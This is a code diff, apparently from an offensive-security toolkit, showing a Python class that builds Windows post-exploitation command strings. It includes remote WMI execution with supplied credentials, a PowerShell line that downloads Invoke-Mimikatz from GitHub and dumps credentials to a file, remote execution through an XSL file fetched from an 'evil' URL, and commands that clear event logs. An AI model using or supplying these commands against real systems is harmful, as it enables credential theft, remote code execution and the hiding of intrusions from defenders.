@@ -1,6 +1,7 @@
 # encoding: utf8
 import os
 
+
 class Shell:
     def __init__(self):
         self.info = {
@@ -46,15 +47,15 @@ del \\10.10.10.104\\c$\\mimi.txt
 远程执行 => wmic os get /FORMAT:"https://example.com/evil" (服务器上文件为evil.xsl)
 """
 
+    def wmi_exec(self, ip, user, password):
+        return """wmic /node:{0} /user:{1} /password:{2} process get Name,ProcessId\nwmiexec.py {1}:{2}@{0}""".format(
+            ip, user, password)
 
-    def wmi_exec(self,ip,user,password):
-        return """wmic /node:{0} /user:{1} /password:{2} process get Name,ProcessId\nwmiexec.py {1}:{2}@{0}""".format(ip, user, password)
+    def mimikatz(self, ip, user, password):
+        return "wmic /node:{0} /user:{1} /password:{2} process call create \"Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\mimi.txt\"".format(
+            ip, user, password)
 
-
-    def mimikatz(self,ip,user,password):
-        return "wmic /node:{0} /user:{1} /password:{2} process call create \"Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\mimi.txt\"".format(ip, user, password)
-
-    def reverse(self,url): 
+    def reverse(self, url):
         return "wmic os get /FORMAT:{url}".format(url)
 
     def command(self):
@@ -66,9 +67,4 @@ wmic product get name
 wmic nteventlog where filename='[logfilename]' cleareventlog
 wmic nteventlog where filename='system' cleareventlog
 
-
 """
-
-
-
-
